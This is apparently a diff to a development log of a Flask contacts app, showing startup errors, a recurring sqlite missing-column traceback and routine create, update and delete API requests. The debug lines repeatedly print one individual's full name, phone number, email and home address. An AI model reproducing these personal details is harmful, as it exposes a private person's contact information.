@@ -10,3 +10,424 @@
 [2025-06-08 11:40:50 +0000] [30905] [ERROR] Connection in use: ('0.0.0.0', 5100)
 [2025-06-08 11:40:50 +0000] [30905] [ERROR] connection to ('0.0.0.0', 5100) failed: [Errno 98] Address already in use
 [2025-06-08 11:40:51 +0000] [30905] [ERROR] Can't connect to ('0.0.0.0', 5100)
+Loaded 12 requests from database
+Loaded 12 requests from database
+ * Serving Flask app 'main'
+ * Debug mode: off
+2025-07-01 22:42:22,970 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.120:5000
+2025-07-01 22:42:22,970 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-07-01 22:43:30,655 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "GET /contacts HTTP/1.0" 200 -
+2025-07-01 22:43:30,688 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-01 22:43:30,697 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-01 22:43:30,726 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-01 22:43:30,755 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:43:30,757 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "[32mGET /api/counterparties HTTP/1.0[0m" 308 -
+2025-07-01 22:43:30,770 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "GET /api/counterparties/ HTTP/1.0" 200 -
+Traceback (most recent call last):
+  File "/home/sergey-d/liftbot/app/contacts/routes.py", line 82, in api_get_contacts
+    cursor.execute('''
+sqlite3.OperationalError: no such column: c.name
+2025-07-01 22:43:30,772 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:30] "[35m[1mGET /api/contacts/ HTTP/1.0[0m" 500 -
+2025-07-01 22:43:33,195 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "GET /contacts HTTP/1.0" 200 -
+2025-07-01 22:43:33,223 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-01 22:43:33,227 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-01 22:43:33,238 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-01 22:43:33,256 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:43:33,257 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "[32mGET /api/counterparties HTTP/1.0[0m" 308 -
+2025-07-01 22:43:33,271 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "GET /api/counterparties/ HTTP/1.0" 200 -
+Traceback (most recent call last):
+  File "/home/sergey-d/liftbot/app/contacts/routes.py", line 82, in api_get_contacts
+    cursor.execute('''
+sqlite3.OperationalError: no such column: c.name
+2025-07-01 22:43:33,272 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:33] "[35m[1mGET /api/contacts/ HTTP/1.0[0m" 500 -
+2025-07-01 22:43:43,789 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:43] "[32mPOST /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:43:43,825 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:43] "POST /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:43:43,833 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:43] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+Traceback (most recent call last):
+  File "/home/sergey-d/liftbot/app/contacts/routes.py", line 82, in api_get_contacts
+    cursor.execute('''
+sqlite3.OperationalError: no such column: c.name
+2025-07-01 22:43:43,863 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:43:43] "[35m[1mGET /api/contacts/ HTTP/1.0[0m" 500 -
+Loaded 12 requests from database
+Loaded 12 requests from database
+ * Serving Flask app 'main'
+ * Debug mode: off
+Address already in use
+Port 5000 is in use by another program. Either identify and stop that program, or start the server with a different port.
+Loaded 12 requests from database
+Loaded 12 requests from database
+ * Serving Flask app 'main'
+ * Debug mode: off
+2025-07-01 22:48:48,049 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.120:5000
+2025-07-01 22:48:48,049 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-07-01 22:49:32,633 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "GET /contacts HTTP/1.0" 200 -
+2025-07-01 22:49:32,678 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-01 22:49:32,680 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-01 22:49:32,681 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-01 22:49:32,699 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:49:32,701 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "[32mGET /api/counterparties HTTP/1.0[0m" 308 -
+2025-07-01 22:49:32,716 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "GET /api/counterparties/ HTTP/1.0" 200 -
+2025-07-01 22:49:32,717 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:32] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:49:40,881 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:40] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-01 22:49:43,456 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:43] "DELETE /api/contacts/6 HTTP/1.0" 200 -
+2025-07-01 22:49:43,463 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:43] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:49:43,471 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:43] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:49:47,079 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:47] "DELETE /api/contacts/13 HTTP/1.0" 200 -
+2025-07-01 22:49:47,086 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:47] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+[DEBUG] Загружено контактов: 8
+[DEBUG] Ответ contacts: [{'id': 6, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': []}, {'id': 7, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}]}, {'id': 8, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 9, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 13, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}]}]
+[DEBUG] Загружено контактов: 7
+[DEBUG] Ответ contacts: [{'id': 7, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}]}, {'id': 8, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 9, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 13, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}]}]
+[DEBUG] Загружено контактов: 6
+2025-07-01 22:49:47,094 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:47] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:49:54,758 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:54] "DELETE /api/contacts/7 HTTP/1.0" 200 -
+2025-07-01 22:49:54,768 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:54] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:49:54,776 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:49:54] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:50:00,371 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:00] "DELETE /api/contacts/8 HTTP/1.0" 200 -
+2025-07-01 22:50:00,378 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:00] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:50:00,386 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:00] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:50:04,251 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:04] "DELETE /api/contacts/9 HTTP/1.0" 200 -
+2025-07-01 22:50:04,259 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:04] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+[DEBUG] Ответ contacts: [{'id': 7, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}]}, {'id': 8, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 9, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}]
+[DEBUG] Загружено контактов: 5
+[DEBUG] Ответ contacts: [{'id': 8, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 9, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}]
+[DEBUG] Загружено контактов: 4
+[DEBUG] Ответ contacts: [{'id': 9, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}]
+[DEBUG] Загружено контактов: 3
+2025-07-01 22:50:04,268 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:04] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:50:20,576 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:20] "[32mPOST /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:50:20,587 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:20] "POST /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:50:20,598 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:20] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:50:20,607 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:20] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:50:31,390 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:31] "PUT /api/contacts/14 HTTP/1.0" 200 -
+2025-07-01 22:50:31,399 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:31] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:50:31,407 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:50:31] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:54:42,218 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:42] "DELETE /api/contacts/14 HTTP/1.0" 200 -
+2025-07-01 22:54:42,230 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:42] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:54:42,239 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:42] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:54:44,657 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:44] "DELETE /api/contacts/12 HTTP/1.0" 200 -
+2025-07-01 22:54:44,666 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:44] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+[DEBUG] Ответ contacts: [{'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}]
+[DEBUG] Сохраняем контакт: {'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'attachedCompanies': ['4']}
+[DEBUG] Новый contact_id: 14
+[DEBUG] Привязка контрагентов: ['4']
+[DEBUG] Привязываем contact_id=14 к counterparty_id=4
+[DEBUG] Контакт успешно сохранён!
+[DEBUG] Загружено контактов: 4
